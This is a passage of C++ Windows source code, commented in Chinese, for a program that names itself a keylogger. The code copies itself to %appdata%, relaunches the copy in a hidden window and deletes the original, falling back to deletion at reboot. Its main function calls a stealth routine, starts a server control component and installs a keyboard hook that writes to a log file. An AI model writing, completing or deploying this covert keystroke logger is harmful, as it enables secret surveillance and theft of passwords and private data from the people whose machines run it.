            //MessageBoxW(NULL, L"复制程序到 %appdata%\\Keylogger 失败", L"错误", MB_ICONERROR);
            return;
        }

        std::wstring originalDir = fs::path(currentExe).parent_path().wstring();
        std::wstring shortcutName = fs::path(currentExe).stem().wstring() + L".lnk";
        std::wstring shortcutPath = originalDir + L"\\" + shortcutName;
        CreateShortcut(targetExe, shortcutPath);

        // 使用 ShellExecuteExW 启动副本，传递原程序路径以便删除
        std::wstring params = L"--delete-old \"" + currentExe + L"\"";
        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
        sei.lpVerb = L"open";
        sei.lpFile = targetExe.c_str();
        sei.lpParameters = params.c_str();
        sei.nShow = SW_HIDE;  // 隐藏窗口

        std::wcout << L"Starting new process with params: " << params << std::endl;

        if (ShellExecuteExW(&sei))
        {
            // 等待副本进程启动完成（可选）
            WaitForInputIdle(sei.hProcess, 5000);
            CloseHandle(sei.hProcess);
            ExitProcess(0);   // 原进程退出
        }
        else
        {
            DWORD err = GetLastError();
            std::wcerr << L"ShellExecuteExW failed, error: " << err << std::endl;
            wchar_t msg[256];
            wsprintfW(msg, L"启动副本失败，错误码：%lu", err);
            MessageBoxW(NULL, msg, L"错误", MB_ICONERROR);
        }
    }
    else
    {
        // 从命令行获取要删除的旧程序路径
        std::wstring cmdLine = GetCommandLineW();
        std::wcout << L"Command line: " << cmdLine << std::endl;

        int argc;
        LPWSTR* argv = CommandLineToArgvW(cmdLine.c_str(), &argc);

        std::wcout << L"Argument count: " << argc << std::endl;
        for (int i = 0; i < argc; i++) {
            std::wcout << L"argv[" << i << L"]: " << argv[i] << std::endl;
        }

        // 查找 --delete-old 参数
        std::wstring oldPath;
        bool foundDeleteArg = false;

        for (int i = 1; i < argc - 1; i++) {
            if (wcscmp(argv[i], L"--delete-old") == 0) {
                // 支持路径包含空格的情况：从 i+1 开始合并所有剩余参数
                oldPath = argv[i + 1];
                // 如果路径被分割成多个参数（不包含盘符分隔符），合并它们
                for (int j = i + 2; j < argc; j++) {
                    // 检查是否是另一个参数（以 - 开头）
                    if (argv[j][0] == L'-') {
                        break;
                    }
                    oldPath += L" ";
                    oldPath += argv[j];
                }
                foundDeleteArg = true;
                break;
            }
        }

        if (foundDeleteArg && !oldPath.empty())
        {
            std::wcout << L"Attempting to delete: " << oldPath << std::endl;

            // 等待原程序退出
            std::wcout << L"Waiting 5 seconds for original process to exit..." << std::endl;
            Sleep(5000);

            bool deleted = false;
            DWORD lastError = 0;
            for (int i = 0; i < 10; ++i)
            {
                std::wcout << L"Attempt " << (i + 1) << L": Checking if file exists..." << std::endl;

                if (!fs::exists(oldPath))
                {
                    std::wcout << L"File already deleted or does not exist" << std::endl;
                    deleted = true;
                    break;
                }

                std::wcout << L"File exists, attempting to delete..." << std::endl;
                SetFileAttributesW(oldPath.c_str(), FILE_ATTRIBUTE_NORMAL);

                if (DeleteFileW(oldPath.c_str()))
                {
                    std::wcout << L"Successfully deleted old program" << std::endl;
                    deleted = true;
                    break;
                }

                lastError = GetLastError();
                std::wcout << L"Delete failed, error: " << lastError << std::endl;

                if (lastError == ERROR_SHARING_VIOLATION || lastError == ERROR_ACCESS_DENIED)
                {
                    std::wcout << L"File in use, waiting 1 second..." << std::endl;
                    Sleep(1000);
                    continue;
                }
                else
                {
                    break;
                }
            }

            if (!deleted)
            {
                std::wcout << L"Normal delete failed, trying MoveFileEx..." << std::endl;
                if (!MoveFileExW(oldPath.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT))
                {
                    lastError = GetLastError();
                    std::wcerr << L"MoveFileEx failed, error: " << lastError << std::endl;

                    wchar_t msg[512];
                    swprintf_s(msg, L"删除原程序失败。\n路径: %s\n错误码: %lu\n将在下次重启时尝试删除。",
                        oldPath.c_str(), lastError);
                    MessageBoxW(NULL, msg, L"删除警告", MB_ICONWARNING);
                }
                else
                {
                    std::wcout << L"Scheduled for deletion on next reboot" << std::endl;
                    MessageBoxW(NULL, L"原程序将在下次重启时删除", L"提示", MB_ICONINFORMATION);
                }
            }
        }
        else {
            std::wcout << L"No --delete-old argument found or path is empty" << std::endl;
        }
        if (argv) LocalFree(argv);
    }
}

int main()
{
    // 检查是否已有实例在运行
    HANDLE hMutex = CreateMutex(NULL, TRUE, TEXT("KeyloggerInstanceMutex"));
    if (hMutex == NULL || GetLastError() == ERROR_ALREADY_EXISTS)
    {
        if (hMutex) CloseHandle(hMutex);
        return 0; // 已有实例在运行，直接退出
    }

    // 初始化GDI+
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    HandleSelfCopyAndDelete();

    Stealth();

    // 读取上次保存的录制状态
    isRecording = GetSavedRecordingState();

    if (!IsSilentMode()) {
        ShowWelcomeWindow();
    }

#ifdef bootwait 
    while (IsSystemBooting())
    {
        std::cout << "System is booting. Checking again in 10 seconds...\n";
        Sleep(10000);
    }
#endif
#ifdef nowait 
    std::cout << "Skipping system boot check.\n";
#endif

    GetLogDirectory();

    StartServerControl();

    std::string output_filename = MakeOutputFilename();
    std::cout << "Output log to " << output_filename << std::endl;

    output_file.open(output_filename, std::ios_base::app | std::ios::binary);

    SetHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    StopServerControl();
    CleanupNotifyIcon();
    ReleaseHook();
    output_file.close();
    
    // 清理GDI+
    GdiplusShutdown(gdiplusToken);
    
    // 释放互斥量
    CloseHandle(hMutex);
    
    return 0;
}
